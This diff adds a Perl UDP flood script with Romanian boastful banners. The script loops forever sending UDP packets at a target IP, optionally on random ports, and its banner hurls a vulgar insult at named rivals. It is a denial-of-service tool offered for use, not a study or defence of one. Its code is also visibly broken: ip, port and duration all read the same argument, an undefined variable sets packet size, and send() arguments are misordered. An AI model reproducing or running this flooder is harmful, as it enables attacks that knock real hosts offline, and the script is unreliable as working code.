@@ -1,0 +1,103 @@
+#!/usr/bin/perl
+#Cuz-Net =)
+use Socket;
+$ARGC=@ARGV;
+my ($ip,$port,$time);
+$ip=$ARGV[0];
+$port=$ARGV[0];
+$time=$ARGV[0];
+socket(crazy, PF_INET, SOCK_DGRAM, 17);
+$iaddr = inet_aton("$ip");
+
+printf "[0;31m#Bot-1 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n";
+printf "[0;31m#Bot-2 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-3 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-4 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-5 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-6 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-7 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-8 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-9 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-10 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-11 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-12 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-13 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-14 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-15 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-16 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-17 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-18 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-19 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-20 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n";
+printf "[0;31m#Bot-21 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n";
+printf "[0;31m#Bot-22 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-23 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-23 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-25 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-26 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-27 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-28 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-29 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-30 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-31 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-32 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-33 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-34 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-35 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-36 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-37 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-38 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-39 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n"; 
+printf "[0;31m#Bot-40 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n";
+printf "[0;31m#Bot-41 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n";
+printf "[0;31m#Bot-42 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n";
+printf "[0;31m#Bot-43 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n";
+printf "[0;31m#Bot-44 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n";
+printf "[0;31m#Bot-45 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n";
+printf "[0;31m#Bot-46 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n";
+printf "[0;31m#Bot-47 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n";
+printf "[0;31m#Bot-48 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n";
+printf "[0;31m#Bot-49 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n";
+printf "[0;31m#Bot-50 | TheCuz pregateste botii pentru attack : start ip a fost attack-a <3\n";               
+                                                                  
+printf "[0;36m
+   ▄████████     ███      ▄██████▄     ▄███████▄ ███▄▄▄▄      ▄████████     ███ 
+  ███    ███ ▀█████████▄ ███    ███   ███    ███ ███▀▀▀██▄   ███    ███ ▀█████████▄ 
+  ███    █▀     ▀███▀▀██ ███    ███   ███    ███ ███   ███   ███    █▀     ▀███▀▀██  
+  ███            ███   ▀ ███    ███   ███    ███ ███   ███  ▄███▄▄▄         ███   ▀
+▀███████████     ███     ███    ███ ▀█████████▀  ███   ███ ▀▀███▀▀▀         ███     
+         ███     ███     ███    ███   ███        ███   ███   ███    █▄      ███		 
+   ▄█    ███     ███     ███    ███   ███        ███   ███   ███    ███     ███   
+ ▄████████▀     ▄████▀    ▀██████▀   ▄████▀       ▀█   █▀    ██████████    ▄████▀\n";
+
+printf "[0;32m       ###################################################\n";
+printf "[0;32m       # TheCuz a attack-a cu sclavii lui adk botii :D   #\n";
+printf "[0;32m       # TheCuz a cazut apoi sa ridicat si a devenit Nr1 #\n";
+printf "[0;32m       # Muie : Onyx , Yazi , Mihai , Nielo:TheCuz Nr1   #\n";
+printf "[0;32m       ###################################################\n";
+																  
+if ($ARGV[1] ==0 && $ARGV[2] ==0) {
+goto randpackets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto packets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] ==0) {
+goto packets;
+}
+if ($ARGV[1] ==0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &"); 
+goto randpackets;
+}
+packets:
+for (;;) {
+$size=$rand x $rand x $rand;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
+randpackets:
+for (;;) {
+$size=$rand x $rand x $rand;
+$port=(rand 65000) +1;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
